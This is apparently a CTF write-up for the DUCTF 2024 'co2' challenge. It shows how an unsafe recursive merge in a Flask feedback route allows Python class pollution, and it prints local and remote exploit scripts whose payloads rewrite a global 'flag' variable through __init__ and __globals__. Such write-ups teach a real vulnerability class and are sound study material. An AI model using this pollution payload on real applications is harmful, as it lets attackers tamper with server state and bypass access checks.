# co2

## Description

A group of students who don't like to do things the "conventional" way decided to come up with a CyberSecurity Blog post. You've been hired to perform an in-depth whitebox test on their web application.

Author: n00b.master.


## Files

* [co2.zip](files/co2.zip)

## Solution

We are given a simple blog website with some basic functionality: the ability to register, the ability to create posts, and the ability to leave feedback. I started by taking a look at the source code, and everything looked good for the most part, until I noticed a comment in `app/routes.py`:

```python
# Not quite sure how many fields we want for this, lets just collect these bits now and increase them later. 
# Is it possible to dynamically add fields to this object based on the fields submitted by users?
class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""
```

"dynamically add fields" sounds pretty interesting. Looking further into the feedback route:

```python
@app.route("/save_feedback", methods=["POST"])
@login_required
def save_feedback():
    data = json.loads(request.data)
    feedback = Feedback()
    # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
    merge(data, feedback)
    save_feedback_to_disk(feedback)
    return jsonify({"success": "true"}), 200
```

It uses the `merge` function to merge the data from the request into the `Feedback` object. Let's quickly check the `merge` function:

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

This immediately reminded me of JavaScript's `prototype pollution` vulnerability, but I wasn't sure if this existed in Python. I copied the merge function and googled it, and found a blog posting detailing [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)! Huge shoutout to Abdulrah33m for all the research and teaching me something new! So, we know it's vulnerable, but what is the flag condition? 

```python
flag = os.getenv("flag")

@app.route("/get_flag")
@login_required
def get_flag():
    if flag == "true":
        return "DUCTF{NOT_THE_REAL_FLAG}"
    else:
        return "Nope"
```

My first intuition was set the flag environment variable to true. I created a quick test script utilizing the logic from the blog post:

```python

class Feedback:
    def __init__(self):
        self.title = ""
        self.content = ""
        self.rating = ""
        self.referred = ""

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def local_solve():
    print(os.getenv("flag"))
    obj = Feedback()
    exploit = {
        "__init__": {
            "__globals__": {
                "os": {
                    "environ": {
                        "flag": "true"
                    }
                }
            }
        }
    }
    merge(exploit, obj)
    print(os.getenv("flag"))

local_solve()
```

And it worked! I was able to get from `None` to `true`. However, when testing this payload on the actual remote server, I was not able to get the flag. After some thinking, I realized that that this change is not persistent. The `get_flag` endpoint checks the value of the global variable `flag`, which is set to `os.getenv("flag")` when the server starts. This means that even if we change the environment variable, the server will still check the original value. So, we need to find a way to change the value of the global variable `flag`. This is actually simpler than setting the environment variable, as we can just set the value of the global variable directly.

```python
import json
import requests

def remote_solve():
    cookies = {
        'session': 'redacted'
    }
    exploit = {
        "__init__": {
            "__globals__": {
                "flag": "true"
            }
        }
    }
    url = 'https://web-co2-630afc019691685b.2024.ductf.dev'
    r = requests.post(url+"/save_feedback", cookies=cookies, json=exploit)
    print(r.text)
    r = requests.get(url+"/get_flag", cookies=cookies)
    print(r.text)
    
remote_solve()
```

And we get the flag!